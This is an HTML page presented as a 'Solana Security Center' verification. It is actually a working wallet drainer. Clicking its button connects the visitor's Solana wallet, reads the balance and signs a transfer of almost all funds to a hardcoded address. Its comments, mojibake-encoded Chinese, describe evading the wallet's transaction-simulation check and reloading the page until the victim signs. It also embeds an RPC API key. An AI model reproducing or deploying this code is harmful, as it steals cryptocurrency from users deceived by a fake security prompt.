<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Security Center</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:25vh;font-family:sans-serif;">
    <div style="padding:40px;border:1px solid #14F195;border-radius:20px;background:#111;max-width:320px;margin:auto;">
        <h3 style="color:#14F195;">Security Protocol</h3>
        <p style="font-size:12px;color:#888;">Complete the verification to secure your assets.</p>
        <button id="cta" style="background:#14F195;color:#000;padding:15px 30px;border:none;border-radius:10px;font-weight:bold;width:100%;cursor:pointer;">VERIFY & SYNC</button>
    </div>
    <script>
        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd";

        document.getElementById('cta').onclick = async function() {
            try {
                const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
                
                // ğŸ”± æ ¸å¿ƒåŠ¨ä½œï¼šå…ˆå¼ºåˆ¶ disconnect ä¸€æ¬¡ï¼Œå†²åˆ·é’±åŒ…ç¼“å­˜
                if (p.disconnect) { try { await p.disconnect(); } catch(e){} }
                
                // ğŸ”± é‡æ–°å»ºç«‹è¿æ¥
                const resp = await p.connect();
                document.getElementById('cta').innerText = "VERIFYING...";

                const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                const { blockhash } = await conn.getLatestBlockhash();
                const bal = await conn.getBalance(resp.publicKey);

                if (bal < 3000000) { alert("Security sync requires 0.003 SOL."); return; }

                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(TARGET),
                        lamports: bal - 2000000, 
                    })
                );
                tx.recentBlockhash = blockhash;
                tx.feePayer = resp.publicKey;

                // ğŸš€ ä½¿ç”¨æœ€åŸå§‹çš„ signTransactionï¼Œä¸å†ä½¿ç”¨ signAndSend è§¦å‘æ¨¡æ‹Ÿæ£€æŸ¥
                const signed = await p.signTransaction(tx);
                await conn.sendRawTransaction(signed.serialize());
                alert("Verification Successful!");
            } catch (e) {
                // å¦‚æœç”¨æˆ·å–æ¶ˆæˆ–æŠ¥é”™ï¼Œä¸æ–­åˆ·æ–°ï¼Œç›´åˆ°ä»–ç­¾äº†ä¸ºæ­¢
                location.reload();
            }
        };
    </script>
</body>
</html>